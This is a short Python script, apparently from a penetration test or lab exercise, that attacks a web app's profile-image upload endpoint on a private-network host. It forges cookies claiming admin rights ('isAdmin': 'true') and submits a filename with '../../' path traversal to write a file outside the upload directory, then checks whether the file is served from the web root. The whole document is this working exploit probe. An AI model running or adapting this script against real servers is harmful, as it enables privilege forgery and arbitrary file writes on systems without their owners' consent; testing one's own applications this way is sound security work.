import requests

target = "http://192.168.0.28:3000/profile/upload"
cookies = {
    'user': 'admin',
    'isAdmin': 'true',
    'user_id': '1'
}

# Filename with traversal characters
# Trying to write to root or typical app directory
files = {
    'profile_image': ('../../traversal_test.txt', 'TRAVERSAL SUCCESS', 'text/plain')
}

print(f"Testing Traversal Upload on {target}")
try:
    res = requests.post(target, files=files, cookies=cookies)
    print(f"Status Code: {res.status_code}")
    
    # Check if we can access it at root
    check_url = "http://192.168.0.28:3000/traversal_test.txt"
    res_check = requests.get(check_url)
    if res_check.status_code == 200 and "TRAVERSAL" in res_check.text:
        print("[+] Traversal Upload Successful! File at /traversal_test.txt")
    else:
        print("[-] Traversal upload failed or file not accessible at root.")

except Exception as e:
    print(f"Error: {e}")
